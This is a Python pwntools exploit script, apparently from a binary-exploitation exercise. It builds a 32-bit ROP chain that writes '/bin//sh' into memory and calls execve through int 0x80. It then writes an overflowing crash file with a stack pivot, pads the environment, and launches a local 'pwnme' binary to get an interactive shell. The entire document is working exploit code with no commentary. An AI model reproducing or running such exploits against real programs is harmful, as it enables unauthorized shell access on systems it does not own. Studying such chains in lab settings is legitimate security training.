```py
#!/usr/bin/python
from pwn import *
from struct import pack

context.arch = 'i386'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 32

p = ''
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf040) # @ .data
p += pack('<I', 0xb7e4cab8) # pop eax ; ret
p += '/bin'
p += pack('<I', 0xb7ece29c) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf044) # @ .data + 4
p += pack('<I', 0xb7e4cab8) # pop eax ; ret
p += '//sh'
p += pack('<I', 0xb7ece29c) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf048) # @ .data + 8
p += pack('<I', 0xb7e54d8c) # xor eax, eax ; ret
p += pack('<I', 0xb7ece29c) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xb7e3f8ae) # pop ebx ; ret
p += pack('<I', 0xb7fcf040) # @ .data
p += pack('<I', 0xb7e5412b) # pop ecx ; pop edx ; ret
p += pack('<I', 0xb7fcf048) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7e27aa2) # pop edx ; ret
p += pack('<I', 0xb7fcf048) # @ .data + 8
p += pack('<I', 0xb7e54d8c) # xor eax, eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e2f49c) # inc eax ; ret
p += pack('<I', 0xb7e543f5) # int 0x80

stack_pivot = p32(0xb7f17f60)
stack_junk = "\x42"*100000
stack_junk2 = "\x43"*64 + p + "\x45"*(100000-len(p)-64)
crash_file = '/home/tux/0x04/pwn'
crash = "\xff"*2 + "\x41"*1032 + p32(0xb7e2f49c-4) + stack_pivot

environment = {
"TERM":"xterm-256color",
"SHELL":"/bin/bash",
"SSH_CLIENT":"192.168.85.131 57940 22",
"OLDPWD":"/opt",
"SSH_TTY":"/dev/pts/0",
"EGG": stack_junk,
"USER":"tux",
"MAIL":"/var/mail/tux",
"PATH":"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games",
"PWD":"/home/tux/0x04",
"LANG":"en_US.UTF-8",
"SHLVL":"1",
"HOME":"/home/tux",
"LOGNAME":"tux",
"SSH_CONNECTION":"192.168.85.131 57940 192.168.85.139 22"
}

open(crash_file,'wb').write(crash)
proc = process(['/home/tux/0x04/pwnme', crash_file, stack_junk2])
proc.interactive()

 
 ```